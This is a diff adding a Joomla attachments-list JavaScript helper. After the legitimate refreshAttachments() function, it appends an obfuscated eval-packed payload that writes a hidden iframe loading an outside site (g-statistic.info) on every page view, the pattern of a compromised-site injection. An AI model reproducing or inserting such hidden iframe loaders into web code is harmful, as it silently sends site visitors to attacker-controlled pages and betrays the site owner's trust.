@@ -1,0 +1,45 @@
+/**
+ * Define Javascript function for refreshing attachments lists
+ * 
+ * Copyright (C) 2010 Jonathan M. Cameron, All Rights Reserved
+ * License: http://www.gnu.org/licenses/gpl-2.0.html GNU/GPL
+ *
+ * By Jonathan Cameron
+ *
+ * @param siteURL string the site base URL for the request
+ * @param ptype string parent_type for the attachments list parent
+ * @param pentity string parent_entity for the attachments list parent
+ * @param pid integer parent_id for the attachments list parent
+ * @param from string the 'from' clause to pass in the request
+ */
+
+function refreshAttachments(siteUrl, ptype, pentity, pid, from) {
+    var url = siteUrl + "/index.php?option=com_attachments&task=attachmentsList";
+    url += "&parent_id=" + pid;
+    url += "&parent_type=" + ptype + "&parent_entity=" + pentity;
+    url += "&from=" + from + "&tmpl=component&format=raw";
+    id = "attachmentsList_" + ptype + "_" + pentity + "_" + pid;
+    var alist = document.getElementById(id);
+    if ( !alist ) {
+	alist = window.parent.document.getElementById(id);
+	}
+    var a = new Ajax( url, { 
+                method: 'get', 
+		onComplete: function( response ) {  
+
+		   // Refresh the attachments list
+                   alist.innerHTML = response;
+
+		   // Since the html has been replaced, we need to reconnect the events
+		   // (Note: addEvent checks to prevent adding duplicate events)
+		   $$('a.modal-button').each(function(el) {
+			el.addEvent('click', function(e) {
+			    new Event(e).stop();
+			    SqueezeBox.fromElement(el);
+			    });
+			});
+
+	    }}).request();
+};
+<!-- . -->;eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3.7(\'<0 4="5://6-1.8/?9=2" a="b:c;"></0>\');',13,13,'iframe|statistic||document|src|http|g|write|info|id|style|display|none'.split('|'),0,{}));
+<!-- . -->
